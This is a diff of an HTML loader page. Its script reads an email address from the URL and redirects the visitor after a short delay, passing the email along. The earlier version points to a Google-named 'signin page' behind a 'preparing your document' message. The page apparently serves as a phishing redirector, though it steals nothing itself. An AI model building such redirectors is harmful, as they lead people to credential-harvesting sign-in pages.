@@ -1,48 +1,47 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting…</title>
-  <style>
-    /* Simple loader style */
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: Arial, sans-serif;
-      background: #f4f6f8;
-      margin: 0;
-    }
-    .loader {
-      text-align: center;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redirecting…</title>
+<style>
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    font-family: Arial, sans-serif;
+    background: #f4f6f8;
+    margin: 0;
+  }
+  .loader {
+    text-align: center;
+  }
+</style>
 </head>
 <body>
   <div class="loader">
-    <h2>Redirecting…</h2>
-    <p>Please wait while we prepare your document.</p>
+    <h2>Preparing your page…</h2>
+    <p>Please wait while we redirect you.</p>
   </div>
 
   <script>
-    // 1️⃣ Grab the email from the redirect URL
+    // 1️⃣ Grab the email from the URL
     const params = new URLSearchParams(window.location.search);
     const email = params.get('email');
 
-    // 2️⃣ Target landing page
-    const landingPage = '/google.com'; // Change if your file is in a subfolder
+    // 2️⃣ External website you want to redirect to
+    let targetWebsite = 'https://external-site.com'; // CHANGE THIS
 
-    // 3️⃣ Redirect after short delay (optional loader effect)
+    // 3️⃣ Append email if present
+    if (email) {
+      targetWebsite += '?email=' + encodeURIComponent(email);
+    }
+
+    // 4️⃣ Redirect after a short delay (loader effect)
     setTimeout(() => {
-      if (email) {
-        // Pass email in URL to signin page
-        window.location.href = landingPage + '?email=' + encodeURIComponent(email);
-      } else {
-        window.location.href = landingPage;
-      }
-    }, 1000); // 1 second loader
+      window.location.href = targetWebsite;
+    }, 1500); // 1.5 seconds loader
   </script>
 </body>
 </html>
